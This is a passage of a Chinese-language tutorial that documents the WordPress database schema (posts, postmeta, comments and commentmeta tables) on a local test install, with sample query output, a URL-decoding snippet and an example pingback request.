        <span class="n">post_date_gmt</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">22</span> <span class="mi">06</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">42</span>
         <span class="n">post_content</span><span class="p">:</span> <span class="err">中华民族伟大复兴！</span>
           <span class="n">post_title</span><span class="p">:</span> <span class="err">喜迎建党</span><span class="mi">101</span><span class="err">周年</span>
         <span class="n">post_excerpt</span><span class="p">:</span>
          <span class="n">post_status</span><span class="p">:</span> <span class="n">publish</span>
       <span class="n">comment_status</span><span class="p">:</span> <span class="k">open</span>
          <span class="n">ping_status</span><span class="p">:</span> <span class="k">open</span>
        <span class="n">post_password</span><span class="p">:</span> <span class="mi">123456</span>
            <span class="n">post_name</span><span class="p">:</span> <span class="o">%</span><span class="n">e5</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="mi">9</span><span class="k">c</span><span class="o">%</span><span class="n">e8</span><span class="o">%</span><span class="n">bf</span><span class="o">%</span><span class="mi">8</span><span class="n">e</span><span class="o">%</span><span class="n">e5</span><span class="o">%</span><span class="n">bb</span><span class="o">%</span><span class="n">ba</span><span class="o">%</span><span class="n">e5</span><span class="o">%</span><span class="mi">85</span><span class="o">%</span><span class="mi">9</span><span class="n">a101</span><span class="o">%</span><span class="n">e5</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="n">a8</span><span class="o">%</span><span class="n">e5</span><span class="o">%</span><span class="n">b9</span><span class="o">%</span><span class="n">b4</span>
              <span class="n">to_ping</span><span class="p">:</span>
               <span class="n">pinged</span><span class="p">:</span>
        <span class="n">post_modified</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">24</span> <span class="mi">10</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">50</span>
    <span class="n">post_modified_gmt</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">24</span> <span class="mi">02</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">50</span>
<span class="n">post_content_filtered</span><span class="p">:</span>
          <span class="n">post_parent</span><span class="p">:</span> <span class="mi">0</span>
                 <span class="n">guid</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="o">/?</span><span class="n">p</span><span class="o">=</span><span class="mi">5</span>
           <span class="n">menu_order</span><span class="p">:</span> <span class="mi">0</span>
            <span class="n">post_type</span><span class="p">:</span> <span class="n">post</span>
       <span class="n">post_mime_type</span><span class="p">:</span>
        <span class="n">comment_count</span><span class="p">:</span> <span class="mi">0</span>
</pre></div>
<h5 data-content="1" id="2f1a9c8d454a4c8631008d1216bb32cf">post_author</h5>
<p>作者ID<br/>
对应的用户名存储在wp_users表中对应user_login字段</p>
<div class="highlight"><pre><span></span><span class="n">MariaDB</span> <span class="p">[</span><span class="n">wordpress</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">wp_users</span><span class="p">;</span>
<span class="o">+</span><span class="c1">----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+</span>
<span class="o">|</span> <span class="n">ID</span> <span class="o">|</span> <span class="n">user_login</span> <span class="o">|</span> <span class="n">user_pass</span>                          <span class="o">|</span> <span class="n">user_nicename</span> <span class="o">|</span> <span class="n">user_email</span>        <span class="o">|</span> <span class="n">user_url</span> <span class="o">|</span> <span class="n">user_registered</span>     <span class="o">|</span> <span class="n">user_activation_key</span> <span class="o">|</span> <span class="n">user_status</span> <span class="o">|</span> <span class="n">display_name</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+</span>
<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="n">may</span>        <span class="o">|</span> <span class="err">$</span><span class="n">P$BIhCqMiD2uzJeO6twupZ5mLxywmI011</span> <span class="o">|</span> <span class="n">may</span>           <span class="o">|</span> <span class="mi">12345</span><span class="o">@</span><span class="n">qq</span><span class="p">.</span><span class="n">com</span> <span class="o">|</span>          <span class="o">|</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">20</span> <span class="mi">14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">10</span> <span class="o">|</span>                     <span class="o">|</span>           <span class="mi">0</span> <span class="o">|</span> <span class="n">may</span>          <span class="o">|</span>
<span class="o">+</span><span class="c1">----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+</span>
<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<h5 data-content="1" id="e1ea32924f7fc439ee48d433a59325d9">post_date_gmt</h5>
<p>格林威治时间比北京时间早八小时</p>
<h5 data-content="1" id="fca234c2e25de5c122324212cc948fda">post_status</h5>
<p>文章状态有以下八种状态：</p>
<pre><code>1. publish：文章已经发布，可以在网站上被
  2. 所有人查看。
  3. pending：文章等待审核，暂时不会在网站上出现。
  4. draft：文章正在编辑中，还没有准备好发布。
  5. auto-draft：WordPress 在后台自动保存草稿，这种状态意味着文章还没有保存为草稿。
  6. future：文章将在未来的特定时间发布，这是一种预定状态。
  7. private：文章是私有的，只有被授权的用户才能查看。
  8. inherit：文章从其他文章继承状态。
  9. trash：文章被放入回收站，等待被永久删除或还原。</code></pre>
<h5 data-content="1" id="09f3092f80c1189df468055d3dc68f9d">post_password</h5>
<p>文章密码（明文存储）</p>
<h5 data-content="1" id="dd28b5ac80bd4123e124f4de8d87fcd1">post_name</h5>
<p>文章名字 内容非英文的情况下会对字符进行编码 解码方式如下</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">urllib.parse</span>

<span class="n">encoded_str</span> <span class="o">=</span> <span class="s1">'</span><span class="si">%e</span><span class="s1">5</span><span class="si">%96%</span><span class="s1">9c</span><span class="si">%e</span><span class="s1">8%bf</span><span class="si">%8e%e</span><span class="s1">5%bb%ba</span><span class="si">%e</span><span class="s1">5</span><span class="si">%85%</span><span class="s1">9a101</span><span class="si">%e</span><span class="s1">5</span><span class="si">%91%</span><span class="s1">a8</span><span class="si">%e</span><span class="s1">5%b9%b4'</span>
<span class="n">decoded_str</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">encoded_str</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">decoded_str</span><span class="p">)</span>

<span class="n">result</span><span class="p">:</span><span class="err">喜迎建党</span><span class="mi">101</span><span class="err">周年</span>
</pre></div>
<h5 data-content="1" id="5b2ada5a4e89fb52ae16e9d4a90e5ec1">to_ping &amp;&amp; pinged</h5>
<p>这两个字段用于存储将要ping和已ping过的网站<br/>
pingback技术用于通知一个网页或博客其文章被引用，文章被广泛引用有助于SEO优化。<br/>
pingback通过post请求发送，包含通知的内容包括引用文章的标题、URL、引用页面的标题和 URL 等信息。</p>
<div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span><span class="n">xmlrpc</span><span class="p">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="m">1.0</span>
<span class="n">User</span><span class="o">-</span><span class="nl">Agent:</span> <span class="n">Pinger</span><span class="o">/</span><span class="m">1.0</span>
<span class="nl">Host:</span> <span class="n">example</span><span class="p">.</span><span class="n">com</span>
<span class="n">Content</span><span class="o">-</span><span class="nl">Type:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
<span class="n">Content</span><span class="o">-</span><span class="nl">Length:</span> <span class="m">236</span>

<span class="o">&lt;?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">"1.0"</span><span class="o">?&gt;</span>
<span class="o">&lt;</span><span class="n">methodCall</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">methodName</span><span class="o">&gt;</span><span class="n">pingback</span><span class="p">.</span><span class="n">ping</span><span class="o">&lt;/</span><span class="n">methodName</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">params</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">param</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;&lt;</span><span class="n">string</span><span class="o">&gt;</span><span class="nl">http:</span><span class="c1">//example.com/entry/1234&lt;/string&gt;&lt;/value&gt;</span>
        <span class="o">&lt;/</span><span class="n">param</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">param</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;&lt;</span><span class="n">string</span><span class="o">&gt;</span><span class="nl">http:</span><span class="c1">//blog.example.com/entry/5678&lt;/string&gt;&lt;/value&gt;</span>
        <span class="o">&lt;/</span><span class="n">param</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">params</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">methodCall</span><span class="o">&gt;</span>
</pre></div>
<h5 data-content="1" id="ee6c382f08b6619b0e1939f30544d125">port_modified[_gmt]</h5>
<p>文章修改时间（gmt时区）</p>
<h5 data-content="1" id="76bb5e11bd2b747e83afc9ee883d2320">post_content_filtered</h5>
<p>对敏感词/文章格式化后存储的字段</p>
<h5 data-content="1" id="55680baeaf0086584024b0d380124533">post_prent</h5>
<p>文章的父ID，没有父ID则为0，有父ID的情况是文章被修改，那么上一个版本的ID就是父ID</p>
<h5 data-content="1" id="16078a594615e91bd8ec194af305cc69">guid</h5>
<p>全局唯一标识符，被用作文章永久链接，比如长这样：<a href="http://localhost/2023/04/24/5-revision-v1/" target="_blank">http://localhost/2023/04/24/5-revision-v1/</a></p>
<h5 data-content="1" id="47aec4f311bd1f0af3111e717d5d30d5">menu_order</h5>
<p>文章在后台排序的位置</p>
<h5 data-content="1" id="d0bd2911c8990eb2a84c2149822bb319">post_type</h5>
<p>文章类型，在wordpress中默认有post与page两种类型</p>
<h5 data-content="1" id="2517bb564b212e9861651f4e0b6ee842">post_mime_type</h5>
<p>用于存储wordpress中上传媒体文件的MIME类型</p>
<h5 data-content="1" id="cbafa392f2c66522f82794687e9e4ac5">comment_count</h5>
<p>存储文章评论数量</p>
<h4 data-content="1" id="9cb23a4c86b8ea74f2c2f0574434274a">wp_postmeta表结构</h4>
<div class="highlight"><pre><span></span><span class="n">MariaDB</span> <span class="p">[</span><span class="n">wordpress</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">desc</span> <span class="n">wp_postmeta</span><span class="p">;</span>
<span class="o">+</span><span class="c1">------------+---------------------+------+-----+---------+----------------+</span>
<span class="o">|</span> <span class="n">Field</span>      <span class="o">|</span> <span class="k">Type</span>                <span class="o">|</span> <span class="k">Null</span> <span class="o">|</span> <span class="k">Key</span> <span class="o">|</span> <span class="k">Default</span> <span class="o">|</span> <span class="n">Extra</span>          <span class="o">|</span>
<span class="o">+</span><span class="c1">------------+---------------------+------+-----+---------+----------------+</span>
<span class="o">|</span> <span class="n">meta_id</span>    <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">PRI</span> <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span> <span class="n">auto_increment</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">post_id</span>    <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="mi">0</span>       <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">meta_key</span>   <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>        <span class="o">|</span> <span class="n">YES</span>  <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">meta_value</span> <span class="o">|</span> <span class="n">longtext</span>            <span class="o">|</span> <span class="n">YES</span>  <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
<span class="o">+</span><span class="c1">------------+---------------------+------+-----+---------+----------------+</span>
<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">015</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<h4 data-content="1" id="39262c79837df50a71022c8a4ae0ae56">数据内容研究</h4>
<div class="highlight"><pre><span></span><span class="n">MariaDB</span> <span class="p">[</span><span class="n">wordpress</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">wp_postmeta</span><span class="p">;</span>
<span class="o">+</span><span class="c1">---------+---------+------------------------------------------+--------------------+</span>
<span class="o">|</span> <span class="n">meta_id</span> <span class="o">|</span> <span class="n">post_id</span> <span class="o">|</span> <span class="n">meta_key</span>                                 <span class="o">|</span> <span class="n">meta_value</span>         <span class="o">|</span>
<span class="o">+</span><span class="c1">---------+---------+------------------------------------------+--------------------+</span>
<span class="o">|</span>       <span class="mi">1</span> <span class="o">|</span>       <span class="mi">2</span> <span class="o">|</span> <span class="n">_wp_page_template</span>                        <span class="o">|</span> <span class="k">default</span>            <span class="o">|</span>
<span class="o">|</span>       <span class="mi">2</span> <span class="o">|</span>       <span class="mi">1</span> <span class="o">|</span> <span class="n">_edit_lock</span>                               <span class="o">|</span> <span class="mi">1682002379</span><span class="p">:</span><span class="mi">1</span>       <span class="o">|</span>
<span class="o">|</span>       <span class="mi">3</span> <span class="o">|</span>       <span class="mi">1</span> <span class="o">|</span> <span class="n">_wp_trash_meta_status</span>                    <span class="o">|</span> <span class="n">publish</span>            <span class="o">|</span>
<span class="o">|</span>       <span class="mi">4</span> <span class="o">|</span>       <span class="mi">1</span> <span class="o">|</span> <span class="n">_wp_trash_meta_time</span>                      <span class="o">|</span> <span class="mi">1682002381</span>         <span class="o">|</span>
<span class="o">|</span>       <span class="mi">5</span> <span class="o">|</span>       <span class="mi">1</span> <span class="o">|</span> <span class="n">_wp_desired_post_slug</span>                    <span class="o">|</span> <span class="n">hello</span><span class="o">-</span><span class="n">world</span>        <span class="o">|</span>
<span class="o">|</span>       <span class="mi">6</span> <span class="o">|</span>       <span class="mi">1</span> <span class="o">|</span> <span class="n">_wp_trash_meta_comments_status</span>           <span class="o">|</span> <span class="n">a</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="err">{</span><span class="n">i</span><span class="p">:</span><span class="mi">3</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="ss">"1"</span><span class="p">;</span><span class="err">}</span> <span class="o">|</span>
<span class="o">|</span>       <span class="mi">7</span> <span class="o">|</span>       <span class="mi">5</span> <span class="o">|</span> <span class="n">_edit_last</span>                               <span class="o">|</span> <span class="mi">1</span>                  <span class="o">|</span>
<span class="o">|</span>       <span class="mi">8</span> <span class="o">|</span>       <span class="mi">5</span> <span class="o">|</span> <span class="n">_edit_lock</span>                               <span class="o">|</span> <span class="mi">1682305790</span><span class="p">:</span><span class="mi">1</span>       <span class="o">|</span>
<span class="o">|</span>      <span class="mi">11</span> <span class="o">|</span>       <span class="mi">5</span> <span class="o">|</span> <span class="n">_oembed_05b3ec012fcc6815135ccd86d77d21e3</span> <span class="o">|</span> <span class="err">{{</span><span class="k">unknown</span><span class="err">}}</span>        <span class="o">|</span>
<span class="o">+</span><span class="c1">---------+---------+------------------------------------------+--------------------+</span>
</pre></div>
<ul>
<li>_wp_page_template：页面模板文件的路径。</li>
<li>_edit_lock：当前文章或页面的编辑锁定信息。</li>
<li>_wp_trash_meta_status：文章或页面是否在回收站中的状态。</li>
<li>_wp_trash_meta_time：文章或页面进入回收站的时间戳。</li>
<li>_wp_desired_post_slug：希望使用的文章或页面 slug。</li>
<li>_wp_trash_meta_comments_status：文章或页面评论状态，例如是否允许评论。</li>
<li>_edit_last：最后一次编辑文章或页面的用户 ID。</li>
<li>
<em>oembed</em>：与嵌入式内容相关的信息。</li>
</ul>
<h3 data-content="1" id="4422caddaa8cf9b0d79e8065eb8f0e53">1.2.3 关于评论 [wp_commentmeta &amp; wp-comments]</h3>
<h4 data-content="1" id="11c826fae94e7048d0bd48c71fafe571">wp-comments表结构</h4>
<div class="highlight"><pre><span></span><span class="n">MariaDB</span> <span class="p">[</span><span class="n">wordpress</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">desc</span> <span class="n">wp_comments</span><span class="p">;</span>
<span class="o">+</span><span class="c1">----------------------+---------------------+------+-----+---------------------+----------------+</span>
<span class="o">|</span> <span class="n">Field</span>                <span class="o">|</span> <span class="k">Type</span>                <span class="o">|</span> <span class="k">Null</span> <span class="o">|</span> <span class="k">Key</span> <span class="o">|</span> <span class="k">Default</span>             <span class="o">|</span> <span class="n">Extra</span>          <span class="o">|</span>
<span class="o">+</span><span class="c1">----------------------+---------------------+------+-----+---------------------+----------------+</span>
<span class="o">|</span> <span class="n">comment_ID</span>           <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">PRI</span> <span class="o">|</span> <span class="k">NULL</span>                <span class="o">|</span> <span class="n">auto_increment</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_post_ID</span>      <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="mi">0</span>                   <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_author</span>       <span class="o">|</span> <span class="n">tinytext</span>            <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>                <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_author_email</span> <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_author_url</span>   <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_author_IP</span>    <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_date</span>         <span class="o">|</span> <span class="n">datetime</span>            <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="mi">0000</span><span class="o">-</span><span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_date_gmt</span>     <span class="o">|</span> <span class="n">datetime</span>            <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="mi">0000</span><span class="o">-</span><span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_content</span>      <span class="o">|</span> <span class="nb">text</span>                <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>                <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_karma</span>        <span class="o">|</span> <span class="nb">int</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>             <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="mi">0</span>                   <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_approved</span>     <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>         <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="mi">1</span>                   <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_agent</span>        <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_type</span>         <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>         <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">comment_parent</span>       <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="mi">0</span>                   <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">user_id</span>              <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="mi">0</span>                   <span class="o">|</span>                <span class="o">|</span>
<span class="o">+</span><span class="c1">----------------------+---------------------+------+-----+---------------------+----------------+</span>
<span class="mi">15</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">004</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">comment_ID</span> <span class="err">自增评论</span><span class="n">id</span>
<span class="n">comment_post_ID</span> <span class="err">对应文章</span><span class="n">ID</span>
<span class="n">comment_author_email</span> <span class="err">评论者邮箱</span>
<span class="n">comment_author_url</span> <span class="err">评论者网址</span>
<span class="n">comment_author_IP</span> <span class="err">评论者</span><span class="n">IP</span>
<span class="n">comment_date</span> <span class="err">评论时间</span>
<span class="n">comment_content</span> <span class="err">评论正文</span>
<span class="n">comment_karma</span> <span class="err">评论好感度（）</span>
<span class="n">comment_approved</span> <span class="err">评论是否过审</span>
<span class="n">comment_agent</span> <span class="err">评论者</span><span class="n">user_agent</span>
<span class="n">comment_type</span> <span class="err">一般为空或</span><span class="k">null</span><span class="err">，</span>
<span class="n">comment_parent</span> <span class="err">父评论</span><span class="n">ID</span>
</pre></div>
<h4 data-content="1" id="0e21727a1df73ad91c20036d48fe921a">数据内容研究</h4>
<p>添加一条评论，查询wp_comments内容，抽取一条数据作为示例数据<br/>
<img src="https://cdn.nlark.com/yuque/0/2023/png/21402865/1683210153948-7d12e983-efb4-48b5-802c-b1172396beb9.png#averageHue=%23e6e6e6&amp;clientId=u09f1c884-f146-4&amp;from=paste&amp;height=816&amp;id=u77d25f65&amp;originHeight=1632&amp;originWidth=2962&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=309748&amp;status=done&amp;style=none&amp;taskId=u6e6332b9-ce53-4b18-95ba-1e5860e70f9&amp;title=&amp;width=1481"/></p>
<div class="highlight"><pre><span></span><span class="n">MariaDB</span> <span class="p">[</span><span class="n">wordpress</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">wp_comments</span><span class="err">\</span><span class="k">G</span><span class="p">;</span>
<span class="o">***************************</span> <span class="mi">1</span><span class="p">.</span> <span class="k">row</span> <span class="o">***************************</span>
<span class="n">comment_ID</span><span class="p">:</span> <span class="mi">4</span>
<span class="n">comment_post_ID</span><span class="p">:</span> <span class="mi">5</span>
<span class="n">comment_author</span><span class="p">:</span> <span class="n">may</span>
<span class="n">comment_author_email</span><span class="p">:</span> <span class="mi">1234567</span><span class="o">@</span><span class="n">qq</span><span class="p">.</span><span class="n">com</span>
<span class="n">comment_author_url</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">xmay</span><span class="p">.</span><span class="n">com</span>
<span class="n">comment_author_IP</span><span class="p">:</span> <span class="mi">172</span><span class="p">.</span><span class="mi">22</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>
<span class="n">comment_date</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">04</span> <span class="mi">22</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">17</span>
<span class="n">comment_date_gmt</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">04</span> <span class="mi">14</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">17</span>
<span class="n">comment_content</span><span class="p">:</span> <span class="err">高举中国特色社会主义伟大旗帜，全面贯彻新时代中国特色社会主义思想，弘扬伟大建党精神，自信自强、守正创新，踔厉奋发、勇毅前行，为全面建设社会主义现代化国家、全面推进中华民族伟大复兴而团结奋斗。</span>
<span class="n">comment_karma</span><span class="p">:</span> <span class="mi">0</span>
<span class="n">comment_approved</span><span class="p">:</span> <span class="mi">0</span>
<span class="n">comment_agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span> <span class="n">Intel</span> <span class="n">Mac</span> <span class="n">OS</span> <span class="n">X</span> <span class="mi">10</span><span class="n">_15_7</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mi">537</span><span class="p">.</span><span class="mi">36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="k">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mi">112</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span> <span class="n">Safari</span><span class="o">/</span><span class="mi">537</span><span class="p">.</span><span class="mi">36</span>
<span class="n">comment_type</span><span class="p">:</span>
<span class="n">comment_parent</span><span class="p">:</span> <span class="mi">0</span>
<span class="n">user_id</span><span class="p">:</span> <span class="mi">0</span>
<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">005</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<ul>
<li>comment_ID：评论ID</li>
<li>comment_post_ID：评论所属文章或页面的ID</li>
<li>comment_author：评论者名称</li>
<li>comment_author_email：评论者提供的邮箱地址</li>
<li>comment_author_url：评论者提供的网站或博客地址</li>
<li>comment_author_IP：评论者的IP地址</li>
<li>comment_date：评论发表的日期 时间</li>
<li>comment_date_gmt：GMT时区的评论发表日期和时间</li>
<li>comment_content：评论的内容</li>
<li>comment_karma：评论的积分值（根据评论的质量和交互情况来决定）</li>
<li>comment_approved：评论的审核状态，0为未审核，1表示审核通过</li>
<li>comment_agent：评论者的浏览器UA</li>
<li>comment_type：评论类型。pingback或trackback，否则为空</li>
<li>comment_parent：评论的父评论ID，如果该评论是顶级评论，则该字段为0</li>
<li>user_id：评论者的用户ID，如果评论者不是wp注册用户，则该字段的值为0</li>
</ul>
<h4 data-content="1" id="258c8e73c12f0361563a4f5a5155b8cc">wp_commenmeta表结构</h4>
<div class="highlight"><pre><span></span><span class="n">MariaDB</span> <span class="p">[</span><span class="n">wordpress</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">desc</span> <span class="n">wp_commentmeta</span><span class="p">;</span>
<span class="o">+</span><span class="c1">------------+---------------------+------+-----+---------+----------------+</span>
<span class="o">|</span> <span class="n">Field</span>      <span class="o">|</span> <span class="k">Type</span>                <span class="o">|</span> <span class="k">Null</span> <span class="o">|</span> <span class="k">Key</span> <span class="o">|</span> <span class="k">Default</span> <span class="o">|</span> <span class="n">Extra</span>          <span class="o">|</span>
<span class="o">+</span><span class="c1">------------+---------------------+------+-----+---------+----------------+</span>
<span class="o">|</span> <span class="n">meta_id</span>    <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">PRI</span> <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span> <span class="n">auto_increment</span> <span class="o">|</span>
